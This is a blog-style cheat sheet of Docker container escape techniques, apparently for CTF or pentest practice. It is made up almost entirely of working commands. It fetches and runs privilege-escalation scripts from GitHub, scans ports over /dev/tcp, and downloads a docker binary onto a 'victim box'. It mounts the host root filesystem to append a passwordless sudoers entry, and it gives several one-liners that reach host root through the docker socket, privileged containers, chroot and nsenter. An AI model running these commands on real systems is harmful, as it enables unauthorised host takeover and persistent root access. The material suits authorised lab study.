---
title: "Docker Escaped"
date: 2026-07-22 00:00:00 +0800
categories: [Web Exploitation]
tags: [docker, dockerescape]
platform: Web
author: 0xmr
image: /assets/img/posts/docker.jpg
excerpt: "Docker Wordpress..."
---

# Docker 
> Docker is an open-source platform that enables developers to build, ship, and run applications in containers.These containers are lightweight, portable, and isolated units that package an application’s code, runtime, libraries, and dependencies into a single standard unit.

# Resources
[Docker-Escape_Blog](https://k4sth4.github.io/Docker-Escape/)

# Automation Scripts
### linpeas.sh
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O /dev/shm/linpeas.sh
chmod +x /dev/shm/linpeas.sh
# Deep enumeration   
/dev/shm/linpeas.sh -a  
```
### deepce.sh
```bash
wget https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh -O /dev/shm/deepce.sh
chmod +x /dev/shm/deepce.sh
# Deep Enumeration
/dev/shm/deepce.sh 
```
### Docker-Priv Esc
```bash
wget https://raw.githubusercontent.com/flast101/docker-privesc/refs/heads/master/docker-privesc.sh -O /dev/shm/docker-privesc.sh
chmod +x /dev/shm/docker-privesc.sh
# Deep Enumeration
/dev/shm/docker-privesc.sh
```


# Docker Escape Manually

### Check Open Ports
```bash
# Paste Docker IP Address there. 
for p in {1..1000}; do timeout 0.5s bash -c ">/dev/tcp/<Docker-IP>/$p" 2>/dev/null && echo "Port $p open" & done; wait
for p in {1..1024}; do timeout 0.5 bash -c "echo > /dev/tcp/<Docker-IP>/\$p" 2>/dev/null && echo "Port \$p open" & done; wait
```

### Root Escaped Way 1
```bash
# Check if docker is exists or not!
which docker
# Download docker in victim box
wget http://IP/docker -O docker 
# Create Directory
mkdir privesc and cd privesc
# Create file Dockerfile
nano Dockerfile
Content Below:-

FROM debian:wheezy

ENV WORKDIR /privesc
RUN mkdir -p $WORKDIR

VOLUME [ $WORKDIR ]
WORKDIR $WORKDIR
 
# Build this privesc Image
./docker build -t privesc .     -------> make sure [ chmod +x docker ]

# Run it
./docker run -v /:/privesc  -it  privesc /bin/bash     ----> know you are root in docker.

# Edit sudoers
echo 'username ALL=(ALL) NOPASSWD: ALL' >>  /privesc/etc/sudoers   ----> Be carefull in username,put the right username
# Verify sudoers file
cat /privesc/etc/sudoers     --->check the last line, for your username have added or not!
# exit it
exit or  [contol + D]
# Run 
sudo bash      ---> know you are Root.
```

### Root Escaped Way 2
```bash
#  Docker Socket Mounted

# Check if socket is mounted
ls -la /var/run/docker.sock

# If it exists, you can escape easily:
docker run -it --rm -v /:/host -v /var/run/docker.sock:/var/run/docker.sock alpine chroot /host /bin/sh
# Aggresive
docker run --rm -it --privileged -v /:/host ubuntu chroot /host /bin/bash
```

### Root Escaped Way 3
```bash
# Escape via Exposed Docker Daemon
docker run -v /:/mnt --rm -it bash chroot /mnt sh

docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```

### Root Escaped 4
```bash
# Shared Namespaces
nsenter --target 1 --mount sh
```
